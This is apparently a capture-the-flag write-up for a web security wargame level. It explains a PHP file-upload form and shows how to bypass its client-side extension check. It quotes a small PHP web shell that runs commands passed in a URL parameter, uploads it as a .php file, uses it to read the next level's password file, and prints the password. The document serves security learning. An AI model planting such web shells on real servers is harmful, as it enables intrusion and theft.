For this level, it appears the way we will acquire the password for natas13 will have something to do with uploading a JPEG file with a max of 1KB.

Let's take a look at the source code, and, starting from the top, try to figure out exactly what's going on.

```php
function genRandomString() {
   $length = 10;
   $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
   $string = "";    

   for ($p = 0; $p < $length; $p++) {
       $string .= $characters[mt_rand(0, strlen($characters)-1)];
   }

   return $string;
}
```

`genRandomString` takes a length from a variable, in this case 10, and generates a random string of that length that can contain only 0-9 and the standard English alphabet.

```php
function makeRandomPath($dir, $ext) {
   do {
   $path = $dir."/".genRandomString().".".$ext;
   } while(file_exists($path));
   return $path;
}
```

`makeRandomPath` takes a given directory and, using `genRandomString`, generates a random file path with a given extension. It uses a while loop to make sure that the file name does not already exist.

```php
function makeRandomPathFromFilename($dir, $fn) {
   $ext = pathinfo($fn, PATHINFO_EXTENSION);
   return makeRandomPath($dir, $ext);
}
```

`makeRandomPathFromFilename` takes a given directory and a filename, grabs the extension from the file name, and creates a random path for the file to be saved using `makeRandomPath`.

```php
if(array_key_exists("filename", $_POST)) {
$target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
```

Now, once we actually upload a file to the server, it will begin by making a random path for the given filename to be saved to under /upload/.

```php
if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
    echo "File is too big";
} else {
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
        echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
}
```

These are just a set of conditions for the file to be run through. If the size is over 1KB, "File is too big" will be output onto the page. If the file is the correct size, it will check that it was a valid file uploaded via POST by the move_uploaded_file function. If it was uploaded, the user is given a path under which the file has been uploaded. If not, they are given a simple error message.

```php
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? }
```

While I am not familiar with PHP, a few things immediately stand out. For one, it appears to not care about what file type is actually uploaded to the server. They depend on the generation of a random name with a jpg extension on the client side to prevent someone from, say, uploading a php file to their server.

Now, we're going to find out what happens if we upload a malicious PHP file to the server, and what information Burp Suite gives us when we upload it.

Since I am not that familiar with PHP, I did a bit of digging and found the following code on OWASP's page on file upload vulnerabilities:

```php
if(isset($_REQUEST['cmd'])){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}
```

This seemingly allows us to just run a command via a ?cmd= parameter in the browser, so I saved it as test.php and uploaded it.

Upon uploading, Burp Suite picked up a body parameter called "filename" set with the randomly generated name as the value, and I simply changed the file extension to .php rather than .jpg, and it was successfully uploaded!

Using my given link, I just appended '?cmd=cat /etc/natas_webpass/natas13' and the password was echo'd onto the page.

Password: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
